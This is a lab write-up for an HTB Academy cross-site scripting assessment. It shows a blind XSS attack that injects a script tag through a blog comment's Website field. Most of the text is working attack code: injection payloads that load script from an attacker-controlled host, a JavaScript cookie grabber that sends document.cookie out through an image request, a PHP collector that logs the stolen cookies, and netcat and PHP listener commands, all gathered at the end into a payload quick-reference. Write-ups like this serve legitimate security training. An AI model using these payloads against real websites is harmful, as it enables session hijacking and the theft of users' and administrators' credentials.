---
tags: [htb, xss, blind-xss, cookie-theft, session-hijacking, web]
assessment: HTB Cross-Site Scripting (XSS) — Skills Assessment
type: academy
created: 2026-11-05
---

# Blind XSS → Admin Cookie Theft

> [!summary] Core idea
> The payload never runs in *your* browser — it runs later, in the **admin's**, when they review your comment. That's blind XSS: you can't see the result, so you have to make the victim's browser **phone home**. The whole chain is about turning an invisible execution into something that reaches back to a server you control, carrying the admin's cookie with it.

---

## The situation

The `/assessment` page hosts a blog whose comment form says **"comments must be approved by an admin."**

That one sentence sets the whole strategy: an admin will **open your comment in their own session**. If a comment field is injectable, your script executes with the admin's cookies in scope — so the goal becomes **steal the admin's session cookie**, not just pop an alert.

The comment form has several fields (Name, Email, Website, Comment). Any of them *could* be the sink — the first job is finding which one.

---

## Step 1 — Find the vulnerable field (blind, so make each one self-identify)

Because the execution is blind, you can't just look for a popup. The trick: give **each field a differently-named callback**, so when one fires you know *which* field did it.

Start a listener:

```bash
nc -nvlp PWNPO
```

Put this in every field, changing `FieldName` to match the field it's in (`/NameField`, `/EmailField`, `/WebsiteField`, …):

```html
'><script src="http://PWNIP:PWNPO/FieldName"></script>
```

Submit. When the admin's headless browser renders the comment, it requests the script — and the **path tells you the field**:

```
Ncat: Connection from 10.129.43.173
GET /WebsiteField HTTP/1.1
User-Agent: Mozilla/5.0 (...) HeadlessChrome/91.0.4472.101 ...
Referer: http://127.0.0.1/
```

→ the **Website** field is the vulnerable sink. (Name and Email came back sanitized — no callback.)

> [!tip] Why name the callback after the field
> With one generic payload in four fields you'd see a hit but not know its source. Encoding the field name into the requested path turns a blind test into a labelled one — enumeration applied to injection points.

---

## Step 2 — Build the cookie grabber

Now that Website executes, swap the recon payload for one that pulls a **real script** off your server. First, the grabber itself — `script.js`:

```js
new Image().src='http://PWNIP:PWNPO/index.php?c=' + document.cookie;
```

`new Image().src = ...` fires an outbound GET with no visible element and no navigation — quiet and reliable. `document.cookie` rides along in the query string.

```bash
cat << 'EOF' > script.js
new Image().src='http://PWNIP:PWNPO/index.php?c=' + document.cookie;
EOF
```

---

## Step 3 — Build the collector

`index.php` receives the callback, splits multiple cookies apart, and logs each with the victim's IP:

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

Serve both files from the same directory:

```bash
php -S 0.0.0.0:PWNPO
```

---

## Step 4 — Deliver the real payload

Back in the **Website** field, point the script tag at `script.js`:

```html
'><script src=http://PWNIP:PWNPO/script.js></script>
```

The `'>` breaks out of the attribute/tag you're injected into; the `<script src=...>` pulls and runs your grabber in the admin's context.

---

## Step 5 — Catch the cookie

When the admin reviews the comment, their browser loads `script.js`, which beacons back with `document.cookie`:

```
GET /index.php?c=wordpress_test_cookie=WP%20Cookie%20check;
    wp-settings-time-2=1669695315; flag=HTB{...}
```

The `flag` cookie is right there in the exfiltrated value. Session hijack complete.

> [!info] Flag redacted
> The literal flag is intentionally left out here — this repo documents method, not answers.

---

## The chain in one line

**"Admin approves comments" → target the admin's session → per-field callbacks locate the blind-XSS sink (Website) → host a JS cookie grabber + PHP collector → inject `<script src=…>` → admin's browser exfiltrates `document.cookie` → flag is a cookie.**

---

## Reusable takeaways

- [ ] **Blind XSS needs an out-of-band oracle** — you can't see execution, so make the victim's browser call back to you.
- [ ] **Label your probes** — encode the field name into the callback path so a hit tells you *where* it fired.
- [ ] **"Needs admin approval" is a gift** — it guarantees a privileged user will render your input.
- [ ] **`new Image().src` is a clean exfil channel** — no DOM footprint, no navigation, just a GET carrying `document.cookie`.
- [ ] **Break out first, then inject** — `'>` closes the current attribute/tag so your `<script>` lands as real markup.
- [ ] **HttpOnly would have killed this** — the flag cookie was readable from JS, which is the actual misconfiguration being exploited.

## Payload quick-reference

```html
<!-- 1. Per-field recon (change FieldName per field) -->
'><script src="http://PWNIP:PWNPO/FieldName"></script>

<!-- 2. Final delivery (in the Website field) -->
'><script src=http://PWNIP:PWNPO/script.js></script>
```

```js
// script.js — cookie grabber
new Image().src='http://PWNIP:PWNPO/index.php?c=' + document.cookie;
```

```bash
# listener for recon, then PHP server hosting script.js + index.php
nc -nvlp PWNPO
php -S 0.0.0.0:PWNPO
```
